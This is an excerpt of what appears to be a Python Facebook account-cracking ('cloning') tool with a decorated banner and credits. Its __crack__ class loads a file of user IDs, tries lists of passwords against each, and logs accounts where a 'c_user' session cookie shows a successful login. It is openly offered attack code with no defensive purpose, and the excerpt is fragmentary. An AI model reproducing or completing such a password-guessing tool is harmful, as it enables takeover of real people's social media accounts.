...
def R():
			os.system("clear")
			logo()
			print("               \033[1;92m♡ CODDED BY ➵ NAZIRKHAN ♡ \033[1;92m")
			print (' \033[1;92m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡')
			print (" [♡] CREDIT \033[1;92m➵ NAZIR-KHAN \033[1;92m")
			print(" [♡] FRIEND  \033[1;92m➵ AJMALO \033[1;92m")
			print (' \033[1;92m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡')
			print(" [1] Start Cloning(❅。°❆·AJMALO*.❅· °。·❆  ")
			print(" [2] Create File")
			print(" [3] FeedBack")
...
class __crack__:
	...
	def plerr(self):
		try:
			self.apk = input(" [♡] NAZIR FILE DALO ➵ ")
			print (' \033[1;94m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡')
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;94m [NAZIR] %s/%s  \033[1;92mOK-:%s | \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[NAZIR-OK] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
...
\033[1;32m ♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡
    Author   ➵ NAZIRKHAN(AJMALO ALL FB QING)
    Facebook ➵ NAZIR(IF YOUR DERAM YOU CAN DO IT)
    Version  ➵ 0.4
 \033[1;92m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡
 \033[1;32m                   NAZIRKHAN(LOVE YOU AJMALO-XD) \033[1;34m
 \033[1;92m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡"""
ct = datetime.now()
n = ct.month
